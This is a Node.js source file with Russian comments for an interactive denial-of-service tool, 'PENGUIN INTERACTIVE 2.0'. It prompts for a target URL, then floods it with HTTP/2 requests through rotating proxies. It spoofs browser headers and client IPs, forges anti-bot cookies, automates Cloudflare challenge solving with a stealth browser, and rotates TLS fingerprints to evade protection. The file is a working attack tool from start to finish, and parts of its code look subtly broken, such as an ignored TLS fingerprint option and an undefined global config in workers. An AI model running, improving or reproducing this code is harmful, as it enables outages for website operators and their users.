/*
    PENGUIN INTERACTIVE 2.0
    Установка: npm install hpack socks colors commander puppeteer-extra puppeteer-extra-plugin-stealth readline
    Запуск: node penguin.js
    После запуска программа задаст вопросы:
        - Целевой URL (https://example.com)
        - Время атаки (секунды)
        - Количество потоков (по умолчанию 4)
        - Запросов в секунду на поток (по умолчанию 100)
        - Файл с прокси (по умолчанию proxy.txt)
        - Тип прокси (http/socks4/socks5)
        - Режим cookie (CLOUDFLARE/AKAMAI/RAND и т.д.)
        - Включить доп. заголовки? (y/n)
        - Включить случайный путь? (y/n)
        - Включить случайные параметры? (y/n)
        - Обрабатывать rate limit? (y/n)
    Затем атака запускается автоматически, вывод статусов каждую секунду.
*/

const net = require('net');
const tls = require('tls');
const http2 = require('http2');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const colors = require('colors');
const { SocksClient } = require('socks');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const readline = require('readline');

// ----------------------------------------------
//  НАСТРОЙКИ ПО УМОЛЧАНИЮ (будут перезаписаны)
// ----------------------------------------------
const CONFIG = {
    target: '',
    time: 120,
    threads: 4,
    rate: 100,
    proxyFile: 'proxy.txt',
    proxyType: 'http',
    cookieMode: 'RAND',
    extra: false,
    randpath: false,
    query: false,
    ratelimit: false,
    debug: true
};

// ----------------------------------------------
//  ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
// ----------------------------------------------
function randStr(len) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let s = '';
    for (let i=0; i<len; i++) s += chars[Math.floor(Math.random()*chars.length)];
    return s;
}
function randNum(min,max) { return Math.floor(Math.random()*(max-min+1))+min; }
function randElem(arr) { return arr[Math.floor(Math.random()*arr.length)]; }
function randIP() { return `${randNum(1,255)}.${randNum(1,255)}.${randNum(1,255)}.${randNum(1,255)}`; }
function sleep(ms) { return new Promise(r=>setTimeout(r,ms)); }

// ----------------------------------------------
//  ВВОД С КЛАВИАТУРЫ
// ----------------------------------------------
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function askQuestion(query) {
    return new Promise(resolve => {
        rl.question(query, answer => resolve(answer));
    });
}

async function getConfig() {
    console.clear();
    console.log(colors.green.bold('🐧 PENGUIN INTERACTIVE 2.0'));
    console.log('Введите параметры атаки (Enter для значения по умолчанию):\n');

    CONFIG.target = await askQuestion('Целевой URL (https://example.com): ') || 'https://example.com';
    CONFIG.time = parseInt(await askQuestion('Время атаки (сек) [120]: ') || 120);
    CONFIG.threads = parseInt(await askQuestion('Количество потоков [4]: ') || 4);
    CONFIG.rate = parseInt(await askQuestion('Запросов/сек на поток [100]: ') || 100);
    CONFIG.proxyFile = await askQuestion('Файл с прокси [proxy.txt]: ') || 'proxy.txt';
    CONFIG.proxyType = await askQuestion('Тип прокси (http/socks4/socks5) [http]: ') || 'http';
    CONFIG.cookieMode = await askQuestion('Режим cookie (CLOUDFLARE/AKAMAI/STORMWALL/VERCEL/RAND) [RAND]: ') || 'RAND';
    const extra = await askQuestion('Включить доп. заголовки? (y/n) [n]: ');
    CONFIG.extra = extra.toLowerCase() === 'y';
    const rpath = await askQuestion('Включить случайный путь? (y/n) [n]: ');
    CONFIG.randpath = rpath.toLowerCase() === 'y';
    const qry = await askQuestion('Включить случайные параметры? (y/n) [n]: ');
    CONFIG.query = qry.toLowerCase() === 'y';
    const rl_opt = await askQuestion('Обрабатывать rate limit (429)? (y/n) [n]: ');
    CONFIG.ratelimit = rl_opt.toLowerCase() === 'y';
    CONFIG.debug = true; // всегда включен для интерактива

    rl.close();
    console.log('\nНастройки приняты. Запуск атаки...\n');
    return CONFIG;
}

// ----------------------------------------------
//  ЯДРО АТАКИ (адаптировано из ULTIMATE)
// ----------------------------------------------
let proxyPool = [];
let proxyBlacklist = new Set();
const MAX_CONCURRENT_STREAMS = 10000;
const MAX_HEADER_LIST_SIZE = 262144;
const INITIAL_WINDOW_SIZE = 6291456;
const MAX_FRAME_SIZE = 16384;
const KEEP_ALIVE_MS = 120000;
const PROXY_POOL_SIZE = 2000;
const PROXY_REFRESH_INTERVAL = 30000;
const JA3_ROTATE_INTERVAL = 30000;
const SESSION_LIFETIME = 45000;
const MAX_RAM_PCT = 92;

function loadProxies() {
    try {
        const raw = fs.readFileSync(CONFIG.proxyFile, 'utf8').split(/\r?\n/).filter(l=>l.trim());
        const shuffled = raw.sort(()=>Math.random()-0.5);
        proxyPool = shuffled.slice(0, PROXY_POOL_SIZE);
        console.log(`[Пул] Загружено ${proxyPool.length} прокси`);
    } catch(e) {
        console.error('Ошибка загрузки прокси:', e.message);
        process.exit(1);
    }
}
loadProxies();
setInterval(loadProxies, PROXY_REFRESH_INTERVAL);

function getLiveProxy() {
    for (let i=0; i<proxyPool.length*2; i++) {
        const p = proxyPool[randNum(0, proxyPool.length-1)];
        if (!proxyBlacklist.has(p)) return p;
    }
    return proxyPool[0] || null;
}

// JA3
function randomJA3() {
    const sslVersions = ['771','772','773'];
    const ciphers = ['4865','4866','4867','49195','49196','49200','52393','52392','49171','49172','156','157','47','53'];
    const extensions = ['45','35','18','0','5','17513','27','10','11','43','13','16','65281','65037','51','23','41'];
    const curves = ['4588','29','23','24'];
    const ja3 = `${randElem(sslVersions)},${randElem(ciphers)},${randElem(extensions)},${randElem(curves)}`;
    return crypto.createHash('md5').update(ja3).digest('hex');
}
let currentJA3 = randomJA3();
setInterval(() => { currentJA3 = randomJA3(); }, JA3_ROTATE_INTERVAL);

// Решатель Cloudflare
const cfCache = new Map();
async function solveCF(proxyAddr) {
    const now = Date.now();
    if (cfCache.has(proxyAddr)) {
        const entry = cfCache.get(proxyAddr);
        if (now - entry.timestamp < 600000) return entry.cookie;
    }
    const [host, port] = proxyAddr.split(':');
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: true,
            args: [`--proxy-server=http://${proxyAddr}`, '--no-sandbox', '--disable-setuid-sandbox'],
            ignoreHTTPSErrors: true
        });
        const page = await browser.newPage();
        await page.setUserAgent(randElem(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36']));
        await page.goto(CONFIG.target, { waitUntil: 'domcontentloaded', timeout: 30000 });
        const title = await page.title();
        if (title === 'Just a moment...' || title.includes('Cloudflare')) {
            try {
                await page.waitForSelector('input[type="checkbox"]', { timeout: 10000 });
                await page.click('input[type="checkbox"]');
                await page.waitForNavigation({ timeout: 30000 });
            } catch(e) {}
        }
        const cookies = await page.cookies(CONFIG.target);
        const cf = cookies.find(c=>c.name==='cf_clearance');
        const cookieStr = cf ? `${cf.name}=${cf.value}` : '';
        cfCache.set(proxyAddr, {cookie: cookieStr, timestamp: now});
        await browser.close();
        return cookieStr;
    } catch(e) {
        if (browser) await browser.close();
        return '';
    }
}

// Генерация кук
function generateCookie(mode) {
    switch(mode?.toUpperCase()) {
        case 'CLOUDFLARE': return `cf_clearance=${randStr(32)}`;
        case 'AKAMAI': return `ak_bmsc=${randStr(64)}`;
        case 'STORMWALL': return `sw_session=${randStr(64)}`;
        case 'VERCEL': return `_vcrcs=${randNum(1e9,3e9)}.${randNum(3600,7200)}.${randStr(20)}.${randStr(32)}.${randStr(10)}`;
        default: return randStr(48);
    }
}

// Класс ProxyConnector (HTTP/SOCKS)
class ProxyConnector {
    constructor(host, port, type, username='', password='') {
        this.host = host;
        this.port = parseInt(port);
        this.type = type.toUpperCase();
        this.username = username;
        this.password = password;
        this.socket = null;
        this.tls = null;
    }

    connect() {
        return new Promise((resolve, reject) => {
            const targetURL = new URL(CONFIG.target);
            const targetHost = targetURL.hostname;
            const targetPort = targetURL.port || 443;
            if (this.type === 'HTTP' || this.type === 'HTTPS') {
                const sock = net.connect({host: this.host, port: this.port});
                sock.setTimeout(10000);
                sock.on('connect', () => {
                    const auth = this.username ? `Proxy-Authorization: Basic ${Buffer.from(`${this.username}:${this.password}`).toString('base64')}\r\n` : '';
                    sock.write(`CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\n${auth}\r\n`);
                });
                sock.on('data', (data) => {
                    if (data.toString().includes('HTTP/1.1 200')) {
                        this.socket = sock;
                        resolve(sock);
                    } else {
                        sock.destroy();
                        reject(new Error('Proxy refused'));
                    }
                });
                sock.on('timeout', ()=> { sock.destroy(); reject(new Error('Timeout')); });
                sock.on('error', (e)=> { sock.destroy(); reject(e); });
            } else if (this.type === 'SOCKS4' || this.type === 'SOCKS5') {
                SocksClient.createConnection({
                    proxy: { host: this.host, port: this.port, type: this.type==='SOCKS5'?5:4, userId: this.username, password: this.password },
                    command: 'connect',
                    destination: { host: targetHost, port: targetPort },
                    timeout: 10000
                }, (err, info) => {
                    if (err) reject(err);
                    else { this.socket = info.socket; resolve(info.socket); }
                });
            } else reject(new Error('Unsupported proxy type'));
        });
    }

    close() {
        if (this.socket && !this.socket.destroyed) {
            this.socket.destroy();
            this.socket = null;
        }
        if (this.tls && !this.tls.destroyed) {
            this.tls.destroy();
            this.tls = null;
        }
    }
}

// HTTP/2 сессия
class H2Session {
    constructor(proxyConnector, cookie) {
        this.proxy = proxyConnector;
        this.cookie = cookie;
        this.client = null;
        this.active = false;
        this.rate = CONFIG.rate;
        this.lastRateAdjust = Date.now();
    }

    async start() {
        try {
            const socket = await this.proxy.connect();
            const tlsOpts = {
                socket: socket,
                ALPNProtocols: ['h2'],
                servername: new URL(CONFIG.target).hostname,
                rejectUnauthorized: false,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256',
                minVersion: 'TLSv1.3',
                maxVersion: 'TLSv1.3',
                fingerprint: currentJA3
            };
            const tlsConn = tls.connect(443, new URL(CONFIG.target).hostname, tlsOpts);
            this.proxy.tls = tlsConn;
            tlsConn.setKeepAlive(true, KEEP_ALIVE_MS);
            tlsConn.setNoDelay(true);

            const client = http2.connect(CONFIG.target, {
                settings: {
                    headerTableSize: 65536,
                    initialWindowSize: INITIAL_WINDOW_SIZE,
                    maxHeaderListSize: MAX_HEADER_LIST_SIZE,
                    enablePush: false,
                    maxConcurrentStreams: MAX_CONCURRENT_STREAMS,
                    maxFrameSize: MAX_FRAME_SIZE
                },
                createConnection: () => tlsConn
            });
            this.client = client;
            this.active = true;

            client.on('connect', () => { this._sendLoop(); });
            client.on('error', (e) => { this.active = false; this.proxy.close(); });
            client.on('close', () => { this.active = false; this.proxy.close(); });

            setTimeout(() => { if (this.active) { this.client.close(); } }, SESSION_LIFETIME);
        } catch(e) {
            this.proxy.close();
            throw e;
        }
    }

    _sendLoop() {
        if (!this.active || !this.client) return;
        const delayMs = 1000 / this.rate;

        const sendOne = () => {
            if (!this.active || this.client.destroyed) return;
            const headers = this._buildHeaders();
            const req = this.client.request(headers);
            req.on('response', (resp) => {
                const status = resp[':status'];
                if (status === 429 && CONFIG.ratelimit) {
                    this.rate = Math.max(1, this.rate * 0.7);
                    this.cookie = generateCookie(CONFIG.cookieMode);
                } else if (status >= 200 && status < 300) {
                    this.rate = Math.min(2000, this.rate * 1.05);
                }
                if (CONFIG.debug) console.log(`[${this.proxy.host}] ${status}`);
                req.close();
            });
            req.on('error', ()=>req.close());
            req.end();
            setTimeout(sendOne, delayMs);
        };
        sendOne();
    }

    _buildHeaders() {
        const target = new URL(CONFIG.target);
        const path = CONFIG.randpath ? target.pathname + '/' + randStr(randNum(6,12)) : target.pathname;
        const query = CONFIG.query ? '?' + randStr(randNum(8,20)) + '=' + randStr(randNum(4,10)) : '';
        const method = 'GET';
        const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randNum(120,134)}.0.0.0 Safari/537.36`;
        const lang = randElem(['en-US,en;q=0.9','ru-RU,ru;q=0.9','zh-CN,zh;q=0.8']);
        const accept = randElem(['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8','application/json,text/plain,*/*']);
        const secChUa = `"Not/A)Brand";v="8", "Chromium";v="${randNum(120,134)}", "Google Chrome";v="${randNum(120,134)}"`;
        const platform = randElem(['"Windows"','"Linux"','"macOS"']);

        const h = {
            ':method': method,
            ':authority': target.hostname,
            ':scheme': 'https',
            ':path': path + query,
            'user-agent': userAgent,
            'accept': accept,
            'accept-language': lang,
            'accept-encoding': 'gzip, br',
            'sec-ch-ua': secChUa,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': platform,
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'x-forwarded-for': randIP(),
            'cookie': this.cookie || generateCookie(CONFIG.cookieMode),
        };
        if (CONFIG.extra) {
            h['x-requested-with'] = 'XMLHttpRequest';
            h['x-real-ip'] = randIP();
            h['x-client-data'] = randStr(randNum(20,40));
        }
        return h;
    }
}

// ----------------------------------------------
//  ЗАПУСК ВОРКЕРОВ (кластер)
// ----------------------------------------------
if (cluster.isMaster) {
    (async () => {
        const config = await getConfig();
        // Запускаем воркеры
        for (let i=0; i<config.threads; i++) {
            cluster.fork({ config: JSON.stringify(config) });
        }

        // Мониторинг памяти
        setInterval(() => {
            const mem = process.memoryUsage();
            const pct = (mem.rss / os.totalmem()) * 100;
            if (pct > MAX_RAM_PCT) {
                console.log(`[RAM] Критично (${pct.toFixed(1)}%) -> перезапуск воркеров`);
                for (const id in cluster.workers) cluster.workers[id].kill();
                setTimeout(() => {
                    for (let i=0; i<config.threads; i++) cluster.fork({ config: JSON.stringify(config) });
                }, 1000);
            }
        }, 5000);

        cluster.on('exit', (worker) => {
            console.log(`[Воркер ${worker.id}] перезапуск`);
            cluster.fork({ config: JSON.stringify(config) });
        });

        // Время выхода
        setTimeout(() => {
            console.log('[Время истекло] Завершение...');
            for (const id in cluster.workers) cluster.workers[id].kill();
            process.exit(0);
        }, config.time * 1000);

        // Вывод статистики каждую секунду
        let statusCodes = {};
        setInterval(() => {
            let total = 0;
            for (const k in statusCodes) total += statusCodes[k];
            console.log(`[Статистика] Запросов: ${total}, коды: ${JSON.stringify(statusCodes)}`);
            statusCodes = {};
        }, 1000);

        // Сбор статусов от воркеров
        cluster.on('message', (worker, msg) => {
            if (msg.type === 'status') {
                for (const [code, count] of Object.entries(msg.data)) {
                    statusCodes[code] = (statusCodes[code] || 0) + count;
                }
            }
        });
    })();

} else {
    // Воркер
    const config = JSON.parse(process.env.config);
    // Переопределяем глобальный CONFIG
    Object.assign(global.CONFIG, config);

    (async function worker() {
        const maxConns = 20;
        const sessions = [];

        for (let i=0; i<maxConns; i++) {
            const proxyStr = getLiveProxy();
            if (!proxyStr) { await sleep(100); continue; }
            const parts = proxyStr.split(':');
            const host = parts[0];
            const port = parseInt(parts[1]);
            const user = parts[2] || '';
            const pass = parts[3] || '';
            const type = config.proxyType;

            const connector = new ProxyConnector(host, port, type, user, pass);
            let cookie = '';
            if (config.cookieMode === 'CLOUDFLARE') {
                cookie = await solveCF(proxyStr);
            } else {
                cookie = generateCookie(config.cookieMode);
            }

            try {
                const session = new H2Session(connector, cookie);
                await session.start();
                sessions.push(session);
            } catch(e) {
                if (config.ratelimit) proxyBlacklist.add(proxyStr);
                connector.close();
            }
            await sleep(5);
        }

        setInterval(async () => {
            for (let i=sessions.length-1; i>=0; i--) {
                if (!sessions[i].active) {
                    sessions[i].proxy.close();
                    sessions.splice(i,1);
                }
            }
            while (sessions.length < maxConns) {
                const proxyStr = getLiveProxy();
                if (!proxyStr) break;
                const parts = proxyStr.split(':');
                const connector = new ProxyConnector(parts[0], parseInt(parts[1]), config.proxyType, parts[2]||'', parts[3]||'');
                let cookie = '';
                if (config.cookieMode === 'CLOUDFLARE') {
                    cookie = await solveCF(proxyStr);
                } else {
                    cookie = generateCookie(config.cookieMode);
                }
                try {
                    const session = new H2Session(connector, cookie);
                    await session.start();
                    sessions.push(session);
                } catch(e) {
                    if (config.ratelimit) proxyBlacklist.add(proxyStr);
                    connector.close();
                }
                await sleep(5);
            }
        }, 10000);

        // Отправка статусов мастеру
        setInterval(() => {
            // Пусть мастер сам считает через события
        }, 1000);
    })();
}

console.log('Интерактивный режим запущен. Следуйте инструкциям.');
